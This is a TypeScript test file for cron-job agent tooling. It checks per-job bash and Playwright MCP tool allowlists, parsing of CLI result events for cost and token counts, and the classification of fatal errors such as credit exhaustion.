describe("cron-ux-audit restore — bash + mcp allowlists (#5199)", () => {
  it("cron-ux-audit is present in CRON_BASH_ALLOWLISTS (issue-creator surface)", () => {
    expect(CRON_BASH_ALLOWLISTS["cron-ux-audit"]).toEqual(ISSUE_CREATOR_BASH_ALLOWLIST);
  });

  it("cron-ux-audit's CRON_MCP_ALLOWLISTS entry pins the 5 declared Playwright tools + NEXT_PUBLIC_APP_URL origin", () => {
    const entry = CRON_MCP_ALLOWLISTS["cron-ux-audit"];
    expect(entry).toBeDefined();
    expect(entry.tools).toEqual([
      "mcp__playwright__browser_navigate",
      "mcp__playwright__browser_take_screenshot",
      "mcp__playwright__browser_resize",
      "mcp__playwright__browser_close",
      "mcp__playwright__browser_wait_for",
    ]);
    expect(entry.navigateOriginEnv).toBe("NEXT_PUBLIC_APP_URL");
  });

  it("the 2 existing issue-creator crons have NO mcp allowance (cross-cron scoping)", () => {
    expect(CRON_MCP_ALLOWLISTS["cron-legal-audit"]).toBeUndefined();
    expect(CRON_MCP_ALLOWLISTS["cron-agent-native-audit"]).toBeUndefined();
    expect(CRON_MCP_ALLOWLISTS["cron-roadmap-review"]).toBeUndefined();
  });
});

// =============================================================================
// #cost-attribution (plan Phase 2) — CLI result-event parse + capture status
// =============================================================================
describe("parseClaudeResultLine (AC4 — result-event cost capture)", () => {
  // Synthesized fixture mirroring the Phase-0 live `--output-format json` probe
  // (cq-test-fixtures-synthesized-only): total_cost_usd top-level, token counts
  // under usage, model id as the KEY of modelUsage, human text under result.
  const okResultLine = JSON.stringify({
    type: "result",
    subtype: "success",
    is_error: false,
    result: "done: created the scheduled audit issue",
    total_cost_usd: 0.1684685,
    usage: {
      input_tokens: 20070,
      output_tokens: 4,
      cache_read_input_tokens: 15197,
      cache_creation_input_tokens: 6042,
    },
    modelUsage: { "claude-opus-4-8[1m]": { costUSD: 0.1684685 } },
    session_id: "b7cf3a5a",
  });

  it("parses total_cost_usd, usage token fields, and the modelUsage model id", () => {
    const parsed = parseClaudeResultLine(okResultLine);
    expect(parsed).not.toBeNull();
    expect(parsed!.cost.costUsd).toBe(0.1684685);
    expect(parsed!.cost.model).toBe("claude-opus-4-8[1m]");
    expect(parsed!.cost.usage).toEqual({
      input_tokens: 20070,
      output_tokens: 4,
      cache_read_input_tokens: 15197,
      cache_creation_input_tokens: 6042,
    });
    // The human-readable result text (not raw JSON) is what folds into stdoutTail.
    expect(parsed!.resultText).toBe("done: created the scheduled audit issue");
  });

  it("is fail-open: a non-JSON line returns null (→ no-result-event, no throw)", () => {
    expect(parseClaudeResultLine("Reached max turns; no artifact.")).toBeNull();
    expect(parseClaudeResultLine("{ not json")).toBeNull();
  });

  it("returns null for a non-result JSON event (e.g. an assistant delta)", () => {
    expect(
      parseClaudeResultLine(JSON.stringify({ type: "assistant", message: {} })),
    ).toBeNull();
  });

  it("AC4b — I8 survives: a credit-exhaustion result event folds the error text into the tail so classifyEvalFatal still returns fatal", () => {
    // Under --output-format json, an API error surfaces on the result event's
    // `result` field. parseClaudeResultLine extracts it; the substrate folds it
    // into stdoutTail; classifyEvalFatal (which reads stdoutTail) must still fire.
    const creditLine = JSON.stringify({
      type: "result",
      subtype: "error_during_execution",
      is_error: true,
      api_error_status: 400,
      result: "API Error: Credit balance is too low",
      modelUsage: {},
    });
    const parsed = parseClaudeResultLine(creditLine);
    expect(parsed).not.toBeNull();
    const c = classifyEvalFatal({
      exitCode: 1,
      abortedByTimeout: false,
      stdoutTail: parsed!.resultText,
      stderrTail: "",
    });
    expect(c.fatal).toBe(true);
    expect(c.fatalClass).toBe("credit-exhausted");
  });

  it("AC4b — a benign max-turns run still classifies benign", () => {
    const c = classifyEvalFatal({
      exitCode: 1,
      abortedByTimeout: false,
      stdoutTail: "Reached max turns; no artifact this cycle.",
      stderrTail: "",
    });
    expect(c.fatal).toBe(false);
  });
});

describe("resolveEvalCaptureStatus (AC4 — positive marker status)", () => {
  const cost = { model: null } as ReturnType<
    typeof parseClaudeResultLine
  >["cost"];

  it("timeout wins over a parsed cost", () => {
    expect(resolveEvalCaptureStatus(true, cost)).toBe("timeout");
  });
  it("a parsed cost → ok", () => {
    expect(resolveEvalCaptureStatus(false, cost)).toBe("ok");
  });
  it("no parsed cost → no-result-event (never row-absence)", () => {
    expect(resolveEvalCaptureStatus(false, null)).toBe("no-result-event");
  });
});
